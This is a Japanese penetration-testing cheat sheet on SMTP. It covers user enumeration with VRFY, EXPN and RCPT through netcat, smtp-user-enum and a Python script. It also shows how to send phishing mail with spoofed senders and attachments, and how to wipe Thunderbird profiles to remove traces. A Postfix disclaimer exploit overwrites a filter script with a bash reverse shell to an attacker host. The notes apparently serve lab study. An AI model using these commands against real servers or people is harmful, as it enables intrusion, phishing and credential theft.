# Enumeration

## 特徴・目的

- *VRFY*・*EXPN*コマンド等を利用してユーザー名を列挙する
- メールサーバーが適切に設定されていない場合、既存ユーザーを確認可能
- PythonスクリプトやNetcatを使用して自動化可能

## SMTPへの接続

netcat
```zsh
nc -nvC <target_IP> 25
HELO localhost
```
- `-C`：`\r\n`で送信（サーバがコマンドを認識するため必須）
- `HELO localhost`：クライアントの任意のホスト名。これがないと"503 Bad sequence of commands"エラーが表示されてしまう。

telnet
```zsh
telnet <target_IP> 25
HELO localhost
```

### 補足：WindowsマシンへのTelnetクライアントインストール

高権限の場合
```cmd
dism /online /Enable-Feature /FeatureName:TelnetClient
```

低権限の場合→他のマシンからもってくる

## SMTPユーザー列挙（ログイン不要）

- ユーザー名を発見したら、簡単なパスワード(ユーザー名：ユーザー名等）を用いて[110,995 - POP](110,995%20-%20POP.md)や[143,993 - IMAP](143,993%20-%20IMAP.md)にログインし、メールの中身を閲覧する

>[!TIP]
>- ユーザー名の候補としてWebサイトから収集できる人物名以外にも、部門名（例：hr、it等）が使える
>	- `alice@gmail.com`
>	- `hr@gmail.com`

### 自動 w/ smtp-user-enum

- [SMTPへの接続](#SMTPへの接続)は不要
- ユーザー名は基本的に小文字・大文字問わない
- ユーザー名は`@`以降のドメイン名は不要で列挙できる（実際は`admin@gmail.com`でも、`admin`で有効）
- wordlistは`/usr/share/wordlists/metasploit/unix_users.txt` などを使う

```zsh
# VRFYやEXPNが無効化されていることが多いので、ユーザー探索に最も効率の良いコマンド
smtp-user-enum -M RCPT -U <username_wordlist> -t <target_IP>

# 通常のユーザー列挙
smtp-user-enum -M VRFY -U <username_wordlist> -t <target_IP>

# メーリングリストに含まれるユーザーの確認
smtp-user-enum -M EXPN -U <username_wordlist> -t <target_IP>
```

#### 補足：Pythonスクリプト

[SMTPへの接続](#SMTPへの接続)は不要

```python
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[2]
s.connect((ip, 25))
banner = s.recv(1024)
print(banner)

user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

s.close()
```

実行:
```zsh
python3 smtp_enum.py <username> <target_IP>
```
	↓
```zsh
# 成功
# b'220 mail ESMTP Postfix (Ubuntu)\r\n'
# b'252 2.0.0 root\r\n'

# 失敗
# b'220 mail ESMTP Postfix (Ubuntu)\r\n'
# b'550 5.1.1 <johndoe>: Recipient address rejected: User unknown in local recipient table\r\n'
```

### 手動 w/ VRFYコマンド

[SMTPへの接続](#SMTPへの接続)後、VRFYでユーザーを列挙する
	EXPNの場合はメーリングリストの存在有無を列挙する
```zsh
VRFY <username>

# 成功例：252 2.0.0 <username>
# 失敗例：550 5.1.1 <username>: Recipient address rejected: User unknown in local recipient table
```

# 💥Phishingの送信

- SMTPでは認証情報をBase64化したり、送付データをMIME化したりと、手間
- *swaks*を使えば、簡単にメールが送信できるのでオススメ
- Unixシステムは、偽サイトをホストして認証情報を入力させる攻撃が現実的
	- 学習用の演習環境では、urlリンクを踏ませる + ncでリッスンしているだけで認証情報を入手できることもある(⚠️python http serverでは、postリクエストのパラメタはキャプチャできない)
- Windowsでは、[Windows Library Filesの悪用](../../Misc/Client-side%20Attacks/Client-Side%20Attacks：概要とFingerprinting.md#Windows%20Library%20Filesの悪用)を使うことが多い
## swaks

🔗[Swaks - Swiss Army Knife for SMTP - GitHub](https://github.com/jetmore/swaks)

```zsh
# 例：swaks --to jim@relia.com --from maildmz@relia.com --attach @config.library-ms --server 192.168.154.189 --body @body.txt --header "Subject: Please Review the Attached File" -ap
swaks --to <宛先email> --from <送信元email(任意の値)> --attach @<メール添付ファイル> --server <SMTPサーバー> --body @<メール本文のtxtファイル> --header "Subject: <メール件名>" -ap
```
- `-ap`：SMTP認証（プロンプトでユーザー名・パスワード入力が求められる）
	- ※ オープンリレーのSMTPサーバであれば認証不要

- `--server`：SMTPサーバ名がわからないときは以下のコマンドを実行
	- ※演習環境ではターゲットマシンのIPアドレスで可
```zsh
nslookup -query=mx <domain(＝emailの@以降)>
```

- Error：`*** Host did not advertise authentication`
	- →認証不要なので、`-ap`を外す

## sendemail

- Unix系メール配信プログラム

```zsh
sendemail  -t <宛先email> -f <送信元email(任意の値)> -u "<件名>" -m "<メッセージ本文>" -a <添付ファイル> -s <SMTP_SERVER>
```
- オプションでSMTP認証にも対応：`-xu <ID> -xp <password>`

## GUI：Thunderbird

メールクライアント「Thunderbird」にSMTP認証情報を設定してGUIから送信も可能。

- 送信後、痕跡を消すためにプロファイル削除したい場合は：
```zsh
thunderbird -p
```
→ Thunderbird のプロファイルマネージャーを起動し、古いプロファイルを削除。

# Exploit

## Postfix Disclaimer Exploitation

- ソース🔗：[How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)

1. ターゲット上で現在のユーザー権限と、悪用可能なグループ所有ファイルを確認する
```sh
id
# uid=1000(brian.moore) ... groups=...,997(filter)
# → 自分が 'filter' グループに属していることを確認

find / -group filter 2>/dev/null
# /etc/postfix/disclaimer
# /var/spool/filter
# → filterグループが所有する設定ファイルを発見
```
- `filter` グループに書き込み権限があるか確認

2. Postfixの設定ファイル`master.cf` を参照し、当該ファイルがどのように実行されるかを確認する
```sh
cat /etc/postfix/master.cf | grep disclaimer
# dfilt unix - n n - - pipe flags=Rq user=filter argv=/etc/postfix/disclaimer ...
```
- `dfilt`: フィルターサービスとして定義
- `pipe`: メールをパイプ経由でスクリプトに渡す
- `user=filter`: `filter` ユーザーとして実行される
- `argv=...`: メール配送時に `/etc/postfix/disclaimer` を自動実行

3. ペイロードの注入（スクリプト書き換え）
```sh
# スクリプトをリバースシェル命令で上書き
echo '#!/bin/bash' > /etc/postfix/disclaimer
echo 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1' >> /etc/postfix/disclaimer

cat /etc/postfix/disclaimer
# 内容が書き換わっていることを確認
```
- → `/etc/postfix/disclaimer` の実行権限があることを前提とする

4. 攻撃者のマシンからメール送付でdisclaimerをトリガー
```sh
swaks --to <宛先email> \
      --from <任意の送信元email(実在不要)> \
      --server <SMTPサーバーIP> \
      --body "Please check the script update." \
      --header "Subject: Security Update"
```
- → `filter` ユーザーのシェルを獲得

# SMTPコマンドまとめ

| コマンド       | 用途                               |
| ---------- | -------------------------------- |
| HELO/EHLO  | サーバーのバナー情報を取得し、サーバーの機能を確認する      |
| MAIL FROM: | メールの送信元アドレスを偽装してリレー設定を確認する       |
| RCPT TO:   | 宛先メールアドレスが存在するかを確認する（SMTPリレーの検証） |
| DATA       | メール本文の入力開始を指示する                  |
| QUIT       | セッションを終了する                       |
| **VRFY**   | ユーザーの存在を確認                       |
| **EXPN**   | メーリングリストのメンバーを列挙する               |
